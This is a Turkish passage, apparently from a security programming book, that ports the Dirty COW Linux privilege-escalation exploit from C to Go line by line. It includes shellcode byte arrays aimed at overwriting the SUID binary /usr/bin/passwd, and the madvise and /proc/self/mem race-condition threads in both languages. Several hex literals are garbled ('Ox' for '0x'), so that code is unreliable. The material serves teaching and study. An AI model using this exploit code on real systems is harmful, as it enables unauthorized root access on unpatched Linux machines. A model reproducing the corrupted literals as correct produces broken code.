C kodunun mantığının ayrıntılarını açıklamak yerine, önce genel hatlarıyla bakalım, sonra da Go sürümüyle satır satır karşılaştırmak için parçalarına bölelim.

Sömürü (exploit), Linux kabuğu oluşturan, Yürütülebilir ve Bağlanabilir Biçim (Executable and Linkable Format, ELF) türünde bazı zararlı shellcode’lar tanımlar. Bu kodu, çeşitli sistem fonksiyonlarını çağıran birden çok iş parçacığı/goroutine oluşturarak, shellcode’umuzu bellek konumlarına yazmak suretiyle ayrıcalıklı kullanıcı olarak yürütür. Son aşamada, shellcode, SUID biti set edilmiş ve root kullanıcısına ait olan bir ikili (binary) yürütülebilir dosyanın içeriğini üzerine yazarak zafiyeti istismar eder. Bu örnekte,

o ikili `/usr/bin/passwd` dosyasıdır. Normalde, root olmayan bir kullanıcı bu dosyanın üzerine yazamaz. Ancak Dirty COW zafiyeti sayesinde, dosya izinleri korunurken dosyaya rastgele içerik yazabildiğiniz için ayrıcalık yükseltme (privilege escalation) elde edersiniz.

Şimdi C kodunu daha kolay sindirilebilir parçalara bölelim ve her bir bölümü Go’daki karşılığıyla karşılaştıralım. Go sürümünün, özellikle C sürümünü satır satır yeniden üretmeye çalıştığını unutmayın. Liste 9-6’da C’de fonksiyonlarımızın dışında tanımlanan veya ilklendirilen (initialize) global değişkenleri, Liste 9-7’de ise bunların Go sürümünü görüyorsunuz.

```c
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pthloth2,pth3;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
  0x7f, 0x45, Ox4c, Ox46, 0x02, Ox01, Ox01, Ox00, Ox00, Ox00, Ox00, Ox00,
  --snip--
  0x68, Ox00, 0x56, 0x57, 0x48, 0x89, Oxe6, Ox0f, 0x05
};
unsigned int sc_len = 177;
```

**Liste 9-6: C’de ilklendirme**

```go
var mapp uintptr
var signals = make(chan bool, 2)
const SuidBinary = "/usr/bin/passwd"

var sc = []byte{
    Ox7f, 0x45, 0x4c, 0x46, 0x02, Ox01, Ox01, Ox00, Ox00, Ox00, Ox00, Ox00,
    --snip--
    0x68, Ox00, 0x56, 0x57, 0x48, 0x89, Oxe6, Ox0f, 0x05,
}
```

**Liste 9-7: Go’da ilklendirme**

C ve Go arasındaki çeviri oldukça açıktır. C ve Go’daki iki kod bölümü, Go’nun C satırlarının her birine benzer işlevselliği nasıl sağladığını göstermek için aynı satır numaralandırmasını korur. Her iki durumda da `uintptr` türünde bir değişken tanımlayarak eşlenmiş (mapped) belleği takip edersiniz. Go’da, C’nin aksine `map` anahtar (keyword) kelime olduğundan, değişken adını `mapp` olarak bildirirsiniz. Ardından, iş parçacıklarını/goroutine’leri işlemi durdurmaları için işaretlemek amacıyla kullanılacak bir değişken ilklendirirsiniz. C kodu bir tamsayı kullanırken, Go’daki gelenek, bunun yerine tamponlu (buffered) bir boolean kanal (channel) kullanmaktır. İki eşzamanlı (concurrent) fonksiyonu işaretlemek isteyeceğiniz için kanalın uzunluğunu açıkça 2 olarak tanımlarsınız. Sonraki adımda, SUID yürütülebilir dosyanızın yolunu gösteren bir string tanımlarsınız ve global değişkenlerinizi, shellcode’unuzu bir slice içine gömerek tamamlarsınız. C sürümüyle karşılaştırıldığında, Go kodunda birkaç global değişkenin atlandığını görürsünüz; bu da, bunları ihtiyaç halinde kendi kod blokları içinde tanımlayacağınız anlamına gelir.

Şimdi, yarış durumunu (race condition) istismar eden iki temel fonksiyon olan `madvise()` ve `procselfmem()` fonksiyonlarına bakalım. Yine, Liste 9-8’deki C sürümüyle Liste 9-9’daki Go sürümünü karşılaştıracağız.

```c
void *madviseThread(void *arg)
{
     char *str;
     str=(char*)arg;
     int i,c=0;
     for(i=0;i<1000000 && !stop;i++) {
          c+=madvise(map,100,MADV_DONTNEED);
     }
     printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
     char *str;
     str=(char*)arg;
     int f=open("/proc/self/mem",O_RDWR);
     int i,c=0;
     for(i=0;i<1000000 && !stop;i++) {
          lseek(f,map,SEEK_SET);
          c+=write(f, str, sc_len);
     }
     printf("thread stopped\n");
}
```

**Liste 9-8: C’de yarış durumu fonksiyonları**

```go
func madvise() {
    for i := 0; i < 1000000; i++ {
        select {
        case <-signals:
            fmt.Println("madvise done")
            return
        default:
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
        }
    }
}

func procselfmem(payload []byte) {
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
    if err != nil {
        log.Fatal(err)
    }

    for i := 0; i < 1000000; i++ {
        select {
        case <-signals:
            fmt.Println("procselfmem done")
            return
        default:
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
            f.Write(payload)
        }
    }
}
```

**Liste 9-9: Go’da yarış durumu fonksiyonları**

Yarış durumu fonksiyonları, sinyal iletimi (signaling) için farklı yaklaşımlar kullanır. Her iki fonksiyon da çok sayıda yineleme yapan `for` döngüleri içerir. C sürümü, `stop` değişkeninin değerini denetlerken, Go sürümü `signals` kanalından okumaya çalışan bir `select` ifadesi kullanır. Bir sinyal mevcut olduğunda fonksiyon döner (return). Eğer bekleyen bir sinyal yoksa, `default` durumu çalışır. `madvise()` ve `procselfmem()` fonksiyonları arasındaki temel farklılıklar `default` durumunun içinde gerçekleşir. `madvise()` fonksiyonumuzda, `madvise()` C fonksiyonuna bir Linux sistem çağrısı yaparsınız; buna karşılık, `procselfmem()` fonksiyonunuz `lseek()` için Linux sistem çağrıları yapar ve yük/faydalı yükünüzü (payload) belleğe yazar.

Bu fonksiyonların C ve Go sürümleri arasındaki temel farklar şunlardır:
